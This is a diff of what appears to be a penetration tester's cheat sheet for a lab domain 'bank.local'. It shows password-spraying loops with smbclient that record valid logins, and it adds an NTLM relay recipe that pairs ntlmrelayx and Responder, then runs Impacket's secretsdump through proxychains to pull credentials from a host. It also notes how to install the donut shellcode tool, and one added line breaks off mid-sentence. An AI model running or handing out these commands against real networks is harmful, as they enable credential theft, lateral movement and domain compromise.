@@ -60,6 +60,21 @@ Password Spray
   User scan: sleep=5; passwd='Password123!@#'; for i in $(cat users.txt); do smbclient -W bank.local -U $i%$passwd -L //10.100.20.10 && echo $i:$passwd | tee -a ./valid.txt; sleep $sleep; done
   Passwd scan: sleep=1500; user='patrick'; for i in $(cat passwd.txt); do smbclient -W bank.local -U $user%$i -L //10.100.20.10 && echo $user:$i | tee -a ./valid.txt; sleep $sleep; done
 
+Relay NTLM to another host
+
+	Start NTLMRelay First
+		sudo python3 ntlmrelayx.py -t smb://10.100.20.20 -smb2support -socks
+	Setup Proxychains
+		Set port to 1080
+	Start Responder
+		sudo responder -I eth0
+	Responder will reply to any SMB request and ntlm relay will 
+	Verify connections with NTLMRelay
+		run socks to see targets (also has help)
+	Execute Impacket commands via proxychains
+		proxychains smbclient.py -no-pass bank/spongebob@10.100.20.20
+		proxychains secretsdump.py -no-pass  bank/spongebob@10.100.20.20
+
 Donut
   Remove old versions: pip3 uninstall donut-shellcode
   Install: pip3 install donut-shellcode
